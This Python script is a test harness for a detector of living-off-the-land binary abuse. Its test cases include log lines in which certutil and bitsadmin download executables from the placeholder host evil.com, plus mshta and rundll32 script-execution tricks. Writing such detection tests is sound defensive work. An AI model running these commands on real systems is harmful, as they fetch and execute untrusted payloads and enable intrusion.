#!/usr/bin/env python3
"""Tool hardening harness for Cycle 7 - Track 4"""
import sys
sys.path.insert(0, '/app')
from tools.detection import detect_lolbin_abuse

def run_harness(tool_name, tool_func, cases):
    print(f"=== {tool_name} Harness ===")
    
    passed = 0
    total = len(cases)
    
    for i, case in enumerate(cases):
        result = tool_func(case['input'])
        detected = result.get('risk_score', 0) > 50
        expected = case['expected_detected']
        status = 'OK' if detected == expected else 'FAIL'
        
        if detected == expected:
            passed += 1
        else:
            print(f"  {status} Case {i+1}: expected={expected}, got={detected}, risk={result.get('risk_score', 0)}")
    
    score = passed / total * 100
    print(f"  Fitness: {passed}/{total} ({score:.0f}%)")
    return passed, total

# Test cases for detect_lolbin_abuse
lolbin_cases = [
    {"input": {"raw_log": "certutil.exe -urlcache -split -f http://evil.com/payload.exe"}, "expected_detected": True},
    {"input": {"raw_log": "mshta.exe javascript:alert('test')"}, "expected_detected": True},
    {"input": {"raw_log": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \""}, "expected_detected": True},
    {"input": {"raw_log": "bitsadmin.exe /transfer job /download /priority high http://evil.com/file.exe C:\\temp\\file.exe"}, "expected_detected": True},
    {"input": {"raw_log": "certutil.exe -verify mycert.crt"}, "expected_detected": False}
]

p, t = run_harness('detect_lolbin_abuse', detect_lolbin_abuse, lolbin_cases)
print(f"")
print(f"=== Overall Track 4 (Cycle 7) ===")
print(f"Total: {p}/{t} ({p/t*100:.0f}%)")
